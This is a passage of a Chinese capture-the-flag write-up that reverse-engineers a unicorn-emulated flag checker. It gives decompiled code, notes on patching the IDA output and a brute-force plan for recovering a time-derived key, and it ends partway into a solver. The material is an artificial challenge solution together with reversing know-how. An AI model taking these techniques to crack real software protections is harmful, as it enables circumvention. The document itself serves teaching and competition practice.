id="6-提取出来的代码分析"><a href="#6-提取出来的代码分析" class="headerlink" title="6. 提取出来的代码分析"></a>6. 提取出来的代码分析</h2><p>重建控制流，输出 bin 后，代码比较清晰了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// rsp = 0x7777F000</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> __noreturn <span class="hljs-title">sub_4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> __int8 v0; <span class="hljs-comment">// al</span><br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 xorKey[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-2C0h]</span><br>  __int128 v4; <span class="hljs-comment">// [rsp+21h] [rbp-29Fh] BYREF</span><br>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+31h] [rbp-28Fh] BYREF</span><br>  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">17</span>]; <span class="hljs-comment">// [rsp+3Fh] [rbp-281h] BYREF</span><br>  __int64 compare[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-270h] BYREF</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+78h] [rbp-248h]</span><br>  __int64 FlagInData[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+80h] [rbp-240h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v10; <span class="hljs-comment">// [rsp+C2h] [rbp-1FEh]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v11; <span class="hljs-comment">// [rsp+C3h] [rbp-1FDh]</span><br>  <span class="hljs-keyword">int</span> kk; <span class="hljs-comment">// [rsp+C4h] [rbp-1FCh]</span><br>  __int64 v13; <span class="hljs-comment">// [rsp+C8h] [rbp-1F8h]</span><br>  __int128 *v14; <span class="hljs-comment">// [rsp+D0h] [rbp-1F0h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v15; <span class="hljs-comment">// [rsp+DAh] [rbp-1E6h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v16; <span class="hljs-comment">// [rsp+DBh] [rbp-1E5h]</span><br>  <span class="hljs-keyword">int</span> mm; <span class="hljs-comment">// [rsp+DCh] [rbp-1E4h]</span><br>  __int64 v18; <span class="hljs-comment">// [rsp+E0h] [rbp-1E0h]</span><br>  __int64 v19; <span class="hljs-comment">// [rsp+E8h] [rbp-1D8h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v20; <span class="hljs-comment">// [rsp+F3h] [rbp-1CDh]</span><br>  <span class="hljs-keyword">int</span> jj; <span class="hljs-comment">// [rsp+F4h] [rbp-1CCh]</span><br>  __int64 v22; <span class="hljs-comment">// [rsp+F8h] [rbp-1C8h]</span><br>  __int64 *v23; <span class="hljs-comment">// [rsp+100h] [rbp-1C0h]</span><br>  __int64 *v24; <span class="hljs-comment">// [rsp+108h] [rbp-1B8h]</span><br>  <span class="hljs-keyword">int</span> ii; <span class="hljs-comment">// [rsp+110h] [rbp-1B0h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v26; <span class="hljs-comment">// [rsp+114h] [rbp-1ACh]</span><br>  <span class="hljs-keyword">int</span> v27; <span class="hljs-comment">// [rsp+118h] [rbp-1A8h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v28; <span class="hljs-comment">// [rsp+11Ch] [rbp-1A4h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *v29; <span class="hljs-comment">// [rsp+120h] [rbp-1A0h]</span><br>  <span class="hljs-keyword">int</span> n; <span class="hljs-comment">// [rsp+12Ch] [rbp-194h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v31; <span class="hljs-comment">// [rsp+130h] [rbp-190h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v32; <span class="hljs-comment">// [rsp+138h] [rbp-188h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v33; <span class="hljs-comment">// [rsp+140h] [rbp-180h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 data2; <span class="hljs-comment">// [rsp+148h] [rbp-178h]</span><br>  <span class="hljs-keyword">int</span> m; <span class="hljs-comment">// [rsp+154h] [rbp-16Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v36; <span class="hljs-comment">// [rsp+158h] [rbp-168h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 data1; <span class="hljs-comment">// [rsp+160h] [rbp-160h]</span><br>  <span class="hljs-keyword">int</span> i_0; <span class="hljs-comment">// [rsp+16Ch] [rbp-154h]</span><br>  __int64 v39; <span class="hljs-comment">// [rsp+170h] [rbp-150h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 from_t0; <span class="hljs-comment">// [rsp+178h] [rbp-148h]</span><br>  __int64 const_32; <span class="hljs-comment">// [rsp+180h] [rbp-140h]</span><br>  __int64 *flag_ptr; <span class="hljs-comment">// [rsp+188h] [rbp-138h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v43; <span class="hljs-comment">// [rsp+190h] [rbp-130h]</span><br>  __int64 v44; <span class="hljs-comment">// [rsp+198h] [rbp-128h]</span><br>  __int64 *v45; <span class="hljs-comment">// [rsp+1A0h] [rbp-120h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v46; <span class="hljs-comment">// [rsp+202h] [rbp-BEh]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v47; <span class="hljs-comment">// [rsp+203h] [rbp-BDh]</span><br>  <span class="hljs-keyword">int</span> nn; <span class="hljs-comment">// [rsp+204h] [rbp-BCh]</span><br>  __int64 v49; <span class="hljs-comment">// [rsp+208h] [rbp-B8h]</span><br>  <span class="hljs-keyword">char</span> *v50; <span class="hljs-comment">// [rsp+210h] [rbp-B0h]</span><br>  __int64 flagLen; <span class="hljs-comment">// [rsp+218h] [rbp-A8h]</span><br>  __int64 *v52; <span class="hljs-comment">// [rsp+220h] [rbp-A0h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v53; <span class="hljs-comment">// [rsp+22Ah] [rbp-96h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v54; <span class="hljs-comment">// [rsp+22Bh] [rbp-95h]</span><br>  <span class="hljs-keyword">int</span> i1; <span class="hljs-comment">// [rsp+22Ch] [rbp-94h]</span><br>  __int64 v56; <span class="hljs-comment">// [rsp+230h] [rbp-90h]</span><br>  <span class="hljs-keyword">char</span> *v57; <span class="hljs-comment">// [rsp+238h] [rbp-88h]</span><br>  __int64 v58; <span class="hljs-comment">// [rsp+240h] [rbp-80h]</span><br>  __int64 time0; <span class="hljs-comment">// [rsp+248h] [rbp-78h]</span><br>  __int64 v60; <span class="hljs-comment">// [rsp+250h] [rbp-70h]</span><br>  __int64 d2; <span class="hljs-comment">// [rsp+258h] [rbp-68h]</span><br>  __int64 v62; <span class="hljs-comment">// [rsp+260h] [rbp-60h]</span><br>  __int64 d1; <span class="hljs-comment">// [rsp+268h] [rbp-58h]</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+274h] [rbp-4Ch]</span><br>  __int64 data0; <span class="hljs-comment">// [rsp+278h] [rbp-48h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v66; <span class="hljs-comment">// [rsp+282h] [rbp-3Eh]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v67; <span class="hljs-comment">// [rsp+283h] [rbp-3Dh]</span><br>  <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [rsp+284h] [rbp-3Ch]</span><br>  __int64 v69; <span class="hljs-comment">// [rsp+288h] [rbp-38h]</span><br>  <span class="hljs-keyword">char</span> *v70; <span class="hljs-comment">// [rsp+290h] [rbp-30h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v71; <span class="hljs-comment">// [rsp+29Ah] [rbp-26h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v72; <span class="hljs-comment">// [rsp+29Bh] [rbp-25h]</span><br>  <span class="hljs-keyword">int</span> k; <span class="hljs-comment">// [rsp+29Ch] [rbp-24h]</span><br>  __int64 v74; <span class="hljs-comment">// [rsp+2A0h] [rbp-20h]</span><br>  __int64 *flagIn; <span class="hljs-comment">// [rsp+2A8h] [rbp-18h]</span><br>  __int64 v76; <span class="hljs-comment">// [rsp+2B0h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 time0_1; <span class="hljs-comment">// [rsp+2B8h] [rbp-8h]</span><br><br>  v58 = <span class="hljs-number">0x7177625F32303231</span>i64;<br>  __writefsqword(<span class="hljs-number">0</span>, <span class="hljs-number">0x7177625F32303231</span>ui64);<br>  __asm &#123; syscall; Low latency system call &#125;<br>  time0 = MEMORY[<span class="hljs-number">0x1337</span>];                       <span class="hljs-comment">// time(0)</span><br>  time0_1 = MEMORY[<span class="hljs-number">0x1337</span>];<br>  v2 = MEMORY[<span class="hljs-number">0x1337</span>] / <span class="hljs-number">0xE10</span>ui64;<br>  data0 = MEMORY[<span class="hljs-number">0x1337</span>] / <span class="hljs-number">0xE10</span>ui64;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">256</span>; ++i )<br>  &#123;<br>    d1 = <span class="hljs-number">0</span>i64;<br>    d1 = *(_QWORD *)v2;<br>    v62 = d1;<br>    d2 = <span class="hljs-number">0</span>i64;<br>    d2 = *(_QWORD *)(d1 + <span class="hljs-number">1</span>);<br>    v60 = d2;<br>    data0 = __ROL8__((data0 ^ d1) + d2 + <span class="hljs-number">33</span> * data0 + <span class="hljs-number">1</span>, <span class="hljs-number">13</span>);<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>      data0 = v60 ^ (v62 + data0);<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<br>      data0 ^= v62 + v60;<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>      data0 ^= v60 ^ v62;<br>    v2 = i &amp; <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<br>    &#123;<br>      v2 = data0 + v62 + v60;<br>      data0 = v2;<br>    &#125;<br>  &#125;<br>  v76 = data0;<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;input flag:\n&quot;</span>);<br>  v70 = v6;<br>  v69 = <span class="hljs-number">12</span>i64;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v69 != j; ++j )<br>  &#123;<br>    v67 = v70[j];<br>    v66 = v67;<br>    __outbyte(<span class="hljs-number">1u</span>, v67);                         <span class="hljs-comment">// putchar</span><br>  &#125;<br>  <span class="hljs-built_in">memset</span>(FlagInData, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(FlagInData));<br>  flagIn = FlagInData;<br>  v74 = <span class="hljs-number">0x40</span>i64;<br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; ; ++k )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v74 == k )<br>      <span class="hljs-keyword">goto</span> LABEL_3;<br>    v0 = __inbyte(<span class="hljs-number">0</span>);                           <span class="hljs-comment">// get_char</span><br>    v72 = v0;<br>    v71 = v0;<br>    <span class="hljs-keyword">if</span> ( v0 == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>    *((_BYTE *)flagIn + k) = v71;<br>  &#125;<br>  *((_BYTE *)flagIn + k) = <span class="hljs-number">0</span>;<br>LABEL_3:<br>  <span class="hljs-keyword">if</span> ( v76 == <span class="hljs-number">0x1C986C3B22EA63E5</span>i64 )<br>  &#123;<br>    v52 = FlagInData;<br>    <span class="hljs-keyword">for</span> ( flagLen = <span class="hljs-number">0</span>i64; *((_BYTE *)v52 + flagLen); ++flagLen )<br>      ;<br>    v8 = flagLen;<br>    <span class="hljs-keyword">if</span> ( flagLen == <span class="hljs-number">32</span> )<br>    &#123;<br>      v45 = FlagInData;<br>      v44 = <span class="hljs-number">32</span>i64;<br>      v43 = time0_1 / <span class="hljs-number">0xE10</span>;<br>      flag_ptr = FlagInData;<br>      const_32 = <span class="hljs-number">32</span>i64;<br>      from_t0 = time0_1 / <span class="hljs-number">0xE10</span>;<br>      v39 = <span class="hljs-number">0x5249415452455451</span>i64;<br>      __writefsqword(<span class="hljs-number">0</span>, <span class="hljs-number">0x5249415452455451</span>ui64);<br>      <span class="hljs-keyword">for</span> ( i_0 = <span class="hljs-number">0</span>; const_32 != i_0; ++i_0 )<br>      &#123;<br>        data1 = __readfsqword(<span class="hljs-number">0</span>);               <span class="hljs-comment">// 0x5249415452455451</span><br>        v36 = i_0;<br>        <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m != <span class="hljs-number">256</span>; ++m )<br>        &#123;<br>          data2 = __readfsqword(<span class="hljs-number">0</span>);<br>          v33 = data2;<br>          v32 = data2;<br>          v31 = data2;<br>          v36 = (v36 ^ data2) + data2 + <span class="hljs-number">0x21</span> * v36 + <span class="hljs-number">1</span>;<br>          v36 = __ROL8__(v36, <span class="hljs-number">13</span>);<br>          <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>            v36 = v31 ^ (v33 + v36);<br>          <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<br>            v36 ^= v33 + v31;<br>          <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>            v36 ^= v31 ^ v33;<br>          <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<br>            v36 += v33 + v31;<br>        &#125;<br>        *((_BYTE *)flag_ptr + i_0) ^= (_BYTE)data1 + (_BYTE)v36;<br>      &#125;<br>      <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; const_32 != n; n += <span class="hljs-number">4</span> )      <span class="hljs-comment">// 4字节一组</span><br>      &#123;<br>        v29 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)flag_ptr + n);<br>        v28 = *v29;<br>        v27 = <span class="hljs-number">0</span>;<br>        v26 = v28;<br>        v28 = from_t0 + _mm_crc32_u32(<span class="hljs-number">0</span>, v28);<br>        *v29 = v28;<br>      &#125;<br>      xorKey[<span class="hljs-number">0</span>] = <span class="hljs-number">0x178DEC4F232DDB6E</span>i64;<br>      xorKey[<span class="hljs-number">1</span>] = <span class="hljs-number">0xC2AAB7D6D2A167C3</span>ui64;<br>      xorKey[<span class="hljs-number">2</span>] = <span class="hljs-number">0xF1AB91F72761A80F</span>ui64;<br>      xorKey[<span class="hljs-number">3</span>] = <span class="hljs-number">0x3DCEDC28076C41A</span>i64;<br>      <span class="hljs-keyword">for</span> ( ii = <span class="hljs-number">0</span>; v44 != ii; ++ii )<br>        *((_BYTE *)v45 + ii) ^= *((_BYTE *)xorKey + ii);<br>      compare[<span class="hljs-number">0</span>] = <span class="hljs-number">0x3EC81D9432CEF584</span>i64;<br>      compare[<span class="hljs-number">1</span>] = <span class="hljs-number">0xB649A4DCD6BD24FE</span>ui64;<br>      compare[<span class="hljs-number">2</span>] = <span class="hljs-number">0xC5927F0B767A787D</span>ui64;<br>      compare[<span class="hljs-number">3</span>] = <span class="hljs-number">0x1F245B7F751BB52E</span>i64;<br>      v24 = FlagInData;<br>      v23 = compare;<br>      v22 = v8;<br>      <span class="hljs-keyword">for</span> ( jj = <span class="hljs-number">0</span>; ; ++jj )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v22 == jj )<br>        &#123;<br>          v1 = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">goto</span> LABEL_47;<br>        &#125;<br>        v20 = *((_BYTE *)v24 + jj) - *((_BYTE *)v23 + jj);<br>        <span class="hljs-keyword">if</span> ( v20 )<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>      v1 = v20;<br>LABEL_47:<br>      <span class="hljs-keyword">if</span> ( v1 )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)&amp;v4, <span class="hljs-string">&quot;wrong\n&quot;</span>);<br>        v14 = &amp;v4;<br>        v13 = <span class="hljs-number">6</span>i64;<br>        <span class="hljs-keyword">for</span> ( kk = <span class="hljs-number">0</span>; v13 != kk; ++kk )<br>        &#123;<br>          v11 = *((_BYTE *)v14 + kk);<br>          v10 = v11;<br>          __outbyte(<span class="hljs-number">1u</span>, v11);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)&amp;v4 + <span class="hljs-number">7</span>, <span class="hljs-string">&quot;correct\n&quot;</span>);<br>        v19 = (__int64)&amp;v4 + <span class="hljs-number">7</span>;<br>        v18 = <span class="hljs-number">8</span>i64;<br>        <span class="hljs-keyword">for</span> ( mm = <span class="hljs-number">0</span>; v18 != mm; ++mm )<br>        &#123;<br>          v16 = *(_BYTE *)(mm + v19);<br>          v15 = v16;<br>          __outbyte(<span class="hljs-number">1u</span>, v16);<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;wrong\n&quot;</span>);<br>      v50 = v5;<br>      v49 = <span class="hljs-number">6</span>i64;<br>      <span class="hljs-keyword">for</span> ( nn = <span class="hljs-number">0</span>; v49 != nn; ++nn )<br>      &#123;<br>        v47 = v50[nn];<br>        v46 = v47;<br>        __outbyte(<span class="hljs-number">1u</span>, v47);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_DWORD *)&amp;v5[7] = &#x27;norw&#x27;;<br>    *(_WORD *)&amp;v5[11] = &#x27;\ng&#x27;;<br>    v5[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>    v57 = &amp;v5[<span class="hljs-number">7</span>];<br>    v56 = <span class="hljs-number">6</span>i64;<br>    <span class="hljs-keyword">for</span> ( i1 = <span class="hljs-number">0</span>; v56 != i1; ++i1 )<br>    &#123;<br>      v54 = v57[i1];<br>      v53 = v54;<br>      __outbyte(<span class="hljs-number">1u</span>, v54);<br>    &#125;<br>  &#125;<br>  __halt();<br>&#125;<br></code></pre></td></tr></table></figure><p>程序入口调用 syscall，由 unicorn 回调处理获取 time(0) 的值，并根据该值计算一个数 0x1C986C3B22EA63E5</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614143020439.png" class="" title="image-20210614143020439">为了屏蔽 ida 的优化，方便分析，我做了一些小 patch<ul><li>syscall 的 unicorn 回调会修改 rax 寄存器，但是 ida 认为 rax 的值是一个可计算的常数，于是后面与 rax 有关的表达式都被优化。</li><li>for 循环中读取了两次 fs:0 , 有unicorn回调，每次读取的值肯定不一样，ida 认为两次读取的值一样，于是优化成一次访问。</li></ul><p>手动 patch ，即可解决这些问题。</p><p>有两种爆破思路：</p><ul><li>直接爆破 time(0)</li><li>根据 flag 信息反向爆破</li></ul><p>可以用 flag 开头来爆破 time(0) 时间常数</p><p>from_t0 = time_0 / 0xE10;</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614142739068.png" class="" title="image-20210614142739068"><p>由于 4字节一组，<code>qwb&#123;</code>与<code>QWB&#123;</code> 与 <code>flag</code> 与 <code>FLAG</code> 都是已知的 4 个字节并且 v28 可以非常轻松的获得</p><p>通过爆破开头也可以反推 time(0)</p><p>爆破出 time(0) 后的做法就是非常简单的计算任务了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ida.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;x86intrin.h&gt;</span></span><br><br><br><span class="hljs-keyword">static</span> uint64  fs_0;<br><span class="hljs-function">uint64 <span class="hljs-title">getFS0</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// v7[0] = 8461816625668189699LL * v7[0] + 841540768324766462LL;</span><br>    fs_0 = <span 